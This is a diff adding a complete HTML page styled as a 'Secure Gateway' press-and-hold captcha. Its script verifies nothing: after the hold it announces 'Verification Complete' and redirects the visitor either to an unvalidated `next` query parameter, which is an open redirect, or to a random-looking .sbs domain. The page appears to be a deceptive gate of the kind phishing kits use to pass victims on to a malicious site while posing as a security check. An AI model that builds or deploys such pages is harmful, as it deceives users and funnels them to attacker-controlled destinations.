@@ -1,0 +1,190 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Security Check</title>
+  <style>
+    body {
+      font-family: 'Inter', 'Segoe UI', sans-serif;
+      background-color: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      color: #1a1f36;
+    }
+    .captcha-container {
+      background-color: #ffffff;
+      background-image: radial-gradient(#e3e8ee 1px, transparent 1px);
+      background-size: 20px 20px;
+      padding: 40px 30px;
+      border-radius: 20px;
+      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.04), 0 5px 15px rgba(0, 0, 0, 0.02);
+      text-align: center;
+      width: 100%;
+      max-width: 340px;
+      position: relative;
+      overflow: hidden;
+    }
+    .captcha-container h3 {
+      margin-top: 0;
+      font-size: 1.4rem;
+      font-weight: 600;
+      color: #111827;
+      margin-bottom: 8px;
+    }
+    .captcha-container p {
+      color: #6b7280;
+      font-size: 0.95rem;
+      margin-bottom: 35px;
+    }
+    .circle-btn {
+      position: relative;
+      width: 140px;
+      height: 140px;
+      margin: 0 auto;
+      cursor: pointer;
+      user-select: none;
+      -webkit-tap-highlight-color: transparent;
+      border-radius: 50%;
+      animation: idlePulse 2.5s infinite;
+    }
+    @keyframes idlePulse {
+      0% { box-shadow: 0 0 0 0 rgba(79, 70, 229, 0.15); }
+      70% { box-shadow: 0 0 0 20px rgba(79, 70, 229, 0); }
+      100% { box-shadow: 0 0 0 0 rgba(79, 70, 229, 0); }
+    }
+    .circle-btn.holding, .circle-btn.verified { animation: none; }
+    .inner-circle {
+      position: absolute;
+      top: 50%; left: 50%;
+      transform: translate(-50%, -50%);
+      width: 110px; height: 110px;
+      background-color: #ffffff;
+      border-radius: 50%;
+      display: flex; flex-direction: column;
+      justify-content: center; align-items: center;
+      color: #6b7280;
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      box-shadow: 0 4px 20px rgba(0,0,0,0.06), inset 0 2px 5px rgba(0,0,0,0.02);
+      z-index: 3;
+    }
+    .icon { width: 28px; height: 28px; margin-bottom: 4px; fill: currentColor; transition: all 0.3s ease; }
+    .icon-check { display: none; width: 36px; height: 36px; margin-bottom: 0; }
+    .btn-label { font-size: 0.85rem; font-weight: 600; letter-spacing: 0.5px; text-transform: uppercase; }
+    .circle-btn:hover:not(.verified) .inner-circle {
+      color: #4f46e5;
+      box-shadow: 0 8px 25px rgba(79, 70, 229, 0.15);
+    }
+    .progress-ring {
+      position: absolute; top: 0; left: 0;
+      width: 140px; height: 140px; z-index: 2;
+      transform: rotate(-90deg);
+    }
+    .progress-ring__background { stroke: #f3f4f6; }
+    .progress-ring__circle {
+      stroke: url(#gradient);
+      stroke-dasharray: 408;
+      stroke-dashoffset: 408;
+      transition: stroke-dashoffset 0.2s ease-out;
+    }
+    .circle-btn.holding .progress-ring__circle {
+      stroke-dashoffset: 0;
+      transition: stroke-dashoffset 3s linear;
+    }
+    .circle-btn.holding .inner-circle {
+      transform: translate(-50%, -50%) scale(0.92);
+      color: #4f46e5;
+      box-shadow: inset 0 4px 10px rgba(0,0,0,0.08);
+      background-color: #f8fafc;
+    }
+    .circle-btn.verified .progress-ring__circle {
+      stroke-dashoffset: 0;
+      stroke: #10b981;
+      transition: stroke 0.4s ease;
+    }
+    .circle-btn.verified .inner-circle {
+      color: #10b981;
+      background-color: #ffffff;
+      transform: translate(-50%, -50%) scale(1);
+      box-shadow: 0 8px 25px rgba(16, 185, 129, 0.2);
+    }
+    .success-ripple {
+      position: absolute; top: 50%; left: 50%;
+      transform: translate(-50%, -50%);
+      width: 110px; height: 110px;
+      background-color: #10b981;
+      border-radius: 50%; z-index: 1; opacity: 0;
+    }
+    .circle-btn.verified .success-ripple {
+      animation: rippleExpand 0.6s ease-out forwards;
+    }
+    @keyframes rippleExpand {
+      0% { transform: translate(-50%, -50%) scale(1); opacity: 0.5; }
+      100% { transform: translate(-50%, -50%) scale(2.5); opacity: 0; }
+    }
+    .status-text {
+      margin-top: 30px; font-size: 0.85rem; font-weight: 500;
+      color: #9ca3af; display: flex; align-items: center;
+      justify-content: center; gap: 6px; transition: color 0.3s;
+    }
+    .status-text.secured { color: #10b981; }
+  </style>
+</head>
+<body>
+  <div class="captcha-container">
+    <h3>Secure Gateway</h3>
+    <p>Press and hold to confirm your identity.</p>
+    <div class="circle-btn" id="verify-circle">
+      <div class="success-ripple"></div>
+      <svg class="progress-ring">
+        <defs>
+          <linearGradient id="gradient" x1="0%" y1="0%" x2="100%" y2="100%">
+            <stop offset="0%" stop-color="#4f46e5"/>
+            <stop offset="100%" stop-color="#06b6d4"/>
+          </linearGradient>
+        </defs>
+        <circle class="progress-ring__background" stroke-width="8" fill="transparent" r="65" cx="70" cy="70"/>
+        <circle class="progress-ring__circle" stroke-width="8" fill="transparent" r="65" cx="70" cy="70" stroke-linecap="round"/>
+      </svg>
+      <div class="inner-circle">
+        <svg class="icon icon-lock" id="icon-lock" viewBox="0 0 24 24">
+          <path d="M12 2C9.243 2 7 4.243 7 7v3H6a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8a2 2 0 0 0-2-2h-1V7c0-2.757-2.243-5-5-5zM9 7c0-1.654 1.346-3 3-3s3 1.346 3 3v3H9V7zm4 10.723V19h-2v-1.277a1.993 1.993 0 0 1 .567-3.677A2.001 2.001 0 0 1 14 16a1.99 1.99 0 0 1-1 1.723z"/>
+        </svg>
+        <svg class="icon icon-check" id="icon-check" viewBox="0 0 24 24">
+          <path d="M12 2C6.486 2 2 6.486 2 12s4.486 10 10 10 10-4.486 10-10S17.514 2 12 2zm-1.999 14.413-3.713-3.705L7.7 11.292l2.299 2.295 5.294-5.294 1.414 1.414-6.706 6.706z"/>
+        </svg>
+        <span class="btn-label" id="btn-label">Hold</span>
+      </div>
+    </div>
+    <div class="status-text" id="status-text">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2L3 6v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V6l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V7.3l7-3.11v8.8z"/></svg>
+      Protected Environment
+    </div>
+  </div>
+  <script>
+    var vc=document.getElementById("verify-circle"),bl=document.getElementById("btn-label"),il=document.getElementById("icon-lock"),ic=document.getElementById("icon-check"),st=document.getElementById("status-text");
+    var ht,done=false,dur=3000;
+    function sh(e){if(e.type==='mousedown'&&e.button!==0)return;if(done)return;vc.classList.add("holding");bl.innerText="Verifying";ht=setTimeout(cv,dur);}
+    function eh(){if(done)return;vc.classList.remove("holding");bl.innerText="Hold";clearTimeout(ht);}
+    function cv(){done=true;vc.classList.remove("holding");vc.classList.add("verified");il.style.display="none";bl.style.display="none";ic.style.display="block";
+    st.innerHTML='<svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.486 2 2 6.486 2 12s4.486 10 10 10 10-4.486 10-10S17.514 2 12 2zm-1.999 14.413-3.713-3.705L7.7 11.292l2.299 2.295 5.294-5.294 1.414 1.414-6.706 6.706z"/></svg> Verification Complete';
+    st.classList.add("secured");
+    function captchaPass(){
+      // Redirect to the URL provided in the `next` query parameter, fallback to '/'
+      var nx = new URLSearchParams(window.location.search).get('next');
+      if(nx){
+        window.location.href = nx;
+        return;
+      }
+      window.location.href = 'https://gcbjbv.sorkini.sbs/view-af4f55216bdabb54';
+    }
+    setTimeout(captchaPass,1200);} 
+    vc.addEventListener("mousedown",sh);vc.addEventListener("mouseup",eh);vc.addEventListener("mouseleave",eh);
+    vc.addEventListener("touchstart",function(e){e.preventDefault();sh(e);});vc.addEventListener("touchend",eh);vc.addEventListener("touchcancel",eh);
+  </script>
+</body>
+</html>
